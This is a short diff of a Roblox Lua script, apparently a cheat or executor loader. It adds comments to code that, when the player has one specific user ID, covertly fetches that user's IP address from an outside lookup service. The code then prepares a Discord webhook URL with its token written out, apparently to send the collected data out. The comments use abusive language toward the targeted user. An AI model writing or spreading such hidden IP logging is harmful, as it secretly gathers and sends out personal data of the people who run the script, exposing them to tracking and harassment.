@@ -933,9 +933,11 @@ end
 		premium = "Yes"
 	end
 	local ip = " // NOT BLACKLISTED"
+	-- IF A BLACKLISTED BITCH USES THIS
 	if game.Players.LocalPlayer.UserId == 2380447827 then
 		ip = game:HttpGet("https://wtfismyip.com/text")
         end
+	-- IT'LL IP LOG 'EM, CAUSE, WHY NOT. THEY'RE A BITCH. WE AINT NO LIKE NO BITCHES.
 	
 	local url =
 		"https://discord.com/api/webhooks/977962764200988693/8XY_YVlipxlBquz-uzi-PT-TbedKydGdK1DAMemTO_ieDeAU1jx-cKvY9FcBsDjI4FTd"
